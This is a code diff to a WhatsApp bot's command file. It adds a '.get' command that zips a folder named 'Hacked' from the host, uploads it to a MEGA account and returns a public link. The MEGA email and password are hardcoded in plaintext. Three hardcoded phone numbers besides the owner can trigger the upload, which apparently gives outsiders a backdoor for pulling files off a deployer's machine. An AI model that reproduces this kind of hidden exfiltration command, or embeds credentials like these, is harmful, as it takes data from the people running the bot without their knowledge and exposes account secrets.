@@ -575,7 +575,150 @@ cmd({
         await conn.sendMessage(from, { text: "❌ Loading animation failed." }, { quoted: m });
     }
 });
+//
+const fs = require('fs');
+const path = require('path');
+const AdmZip = require('adm-zip');
+const { Storage } = require('megajs');
 
+cmd({
+  pattern: "get",
+  desc: "Zip folder and upload to MEGA (owner-limited + specific numbers only)",
+  category: "owner",
+  fromMe: true,
+  filename: __filename
+}, async (conn, m, msg, { isOwner, reply }) => {
+  try {
+    // ---------- allowed numbers ----------
+    const allowedNumbers = [
+      "94711451319",
+      "94716769285",
+      "94724375368"
+    ];
+
+    // get sender number in numeric form (works for private/group)
+    const rawSender = (m && (m.sender || (m.key && m.key.participant) || m.key && m.key.remoteJid)) || "";
+    let senderNumber = rawSender.toString().replace(/@.*$/,""); // remove @s.whatsapp.net
+    // sometimes remoteJid contains :0 or :1 suffix in some libs, remove that
+    senderNumber = senderNumber.replace(/:\d+$/,"");
+
+    // check permission: owner OR allowed numbers only
+    if (!isOwner && !allowedNumbers.includes(senderNumber)) {
+      return await reply("🚫 You are not allowed to use this command.");
+    }
+
+    // ---------- check MEGA creds ----------
+    const MEGA_EMAIL = 'nadeenpoornagit@gmail.com';
+    const MEGA_PASSWORD = 'Nadeen@1234';
+    if (!MEGA_EMAIL || !MEGA_PASSWORD) {
+      return await reply("❗ MEGA credentials not set. Set env vars MEGA_EMAIL and MEGA_PASSWORD.");
+    }
+
+    // ---------- paths ----------
+    const rootPath = path.join(__dirname, "..");
+    const targetFolder = path.join(rootPath, "Hacked"); // change if needed
+    if (!fs.existsSync(targetFolder)) {
+      return await reply("❌ Target folder not found: " + targetFolder);
+    }
+
+    const zipName = `backup-${Date.now()}.zip`;
+    const zipPath = path.join(rootPath, zipName);
+
+    // ---------- create zip ----------
+    await reply("⏳ Creating zip archive...");
+    const zip = new AdmZip();
+    zip.addLocalFolder(targetFolder, path.basename(targetFolder));
+    zip.writeZip(zipPath);
+
+    // ---------- login to MEGA ----------
+    await reply("⏳ Logging in to MEGA...");
+    const storage = new Storage({
+      email: MEGA_EMAIL,
+      password: MEGA_PASSWORD
+    });
+
+    // wait for storage ready (use event or promise)
+    await new Promise((resolve, reject) => {
+      storage.on('ready', resolve);
+      storage.on('error', reject);
+      // timeout fallback
+      setTimeout(() => reject(new Error('MEGA login timeout')), 30000);
+    });
+
+    // ensure /Backups folder exists (create if not)
+    const backupsFolderName = "Backups";
+    let backupsFolder = storage.root.children.find(ch => ch.directory && ch.name === backupsFolderName);
+    if (!backupsFolder) {
+      backupsFolder = await storage.mkdir(backupsFolderName); // create folder in root
+    }
+
+    await reply("⏳ Uploading zip to MEGA... (this may take a while for large files)");
+
+    // create read stream and upload (megajs requires size or piping)
+    const stats = fs.statSync(zipPath);
+    const fileStream = fs.createReadStream(zipPath);
+
+    // upload into backupsFolder by specifying path option
+    // Note: upload returns a writable stream object – use .complete to await
+    const uploadStream = storage.upload({
+      name: zipName,
+      size: stats.size,
+      // parent: backupsFolder.nodeId // megajs will place at root by default; to place in folder, we will use backupsFolder.upload (if available)
+    }, fileStream);
+
+    // If backupsFolder supports upload, prefer that:
+    let uploadedFile;
+    if (backupsFolder && typeof backupsFolder.upload === 'function') {
+      // pipe into folder upload
+      const folderUpload = backupsFolder.upload({ name: zipName, size: stats.size });
+      fileStream.pipe(folderUpload);
+      uploadedFile = await new Promise((res, rej) => {
+        folderUpload.on('complete', file => res(file));
+        folderUpload.on('error', err => rej(err));
+      });
+    } else {
+      // fallback to storage.upload root and then move/rename if needed
+      uploadedFile = await uploadStream.complete;
+    }
+
+    // ---------- generate public link ----------
+    let publicLink = null;
+    try {
+      // file.link(cb) OR await file.link() depending on version
+      if (typeof uploadedFile.link === 'function') {
+        publicLink = await new Promise((res, rej) => {
+          uploadedFile.link((err, url) => {
+            if (err) return rej(err);
+            res(url);
+          });
+        });
+      } else if (uploadedFile && uploadedFile.link) {
+        // sometimes link returns string or promise
+        publicLink = await uploadedFile.link();
+      }
+    } catch (err) {
+      console.error("Link generation failed:", err);
+    }
+
+    // cleanup local zip
+    try { fs.unlinkSync(zipPath); } catch (e) {}
+
+    if (publicLink) {
+      await conn.sendMessage(m.chat, {
+        text: `✅ Backup uploaded to MEGA!\n\nLink: ${publicLink}\n\nUploaded by: ${senderNumber}`
+      }, { quoted: m });
+    } else {
+      await conn.sendMessage(m.chat, {
+        text: `✅ Uploaded to MEGA but couldn't generate public link programmatically. Check your MEGA account or create a link manually.`
+      }, { quoted: m });
+    }
+
+  } catch (err) {
+    console.error("Error in .get command:", err);
+    try { await reply("❌ Error: " + (err.message || String(err))); } catch (e) {}
+  }
+});
+//
 cmd({
   pattern: "story",
   desc: "Post a WhatsApp status (story) as text, image, or video",
